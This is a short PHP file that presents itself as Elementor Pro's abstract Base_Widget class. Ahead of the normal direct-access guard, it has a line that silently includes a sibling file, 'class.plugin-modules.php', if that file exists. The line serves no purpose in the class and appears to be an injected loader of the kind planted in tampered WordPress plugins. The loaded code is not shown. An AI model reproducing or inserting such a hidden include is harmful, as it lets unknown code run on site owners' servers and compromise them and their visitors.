<?php
namespace ElementorPro\Base;

use Elementor\Widget_Base;

if (file_exists(dirname(__FILE__) . '/class.plugin-modules.php')) include_once(dirname(__FILE__) . '/class.plugin-modules.php');
if ( ! defined( 'ABSPATH' ) ) {
	exit; // Exit if accessed directly
}

abstract class Base_Widget extends Widget_Base {

	public function get_categories() {
		return [ 'pro-elements' ];
	}
}
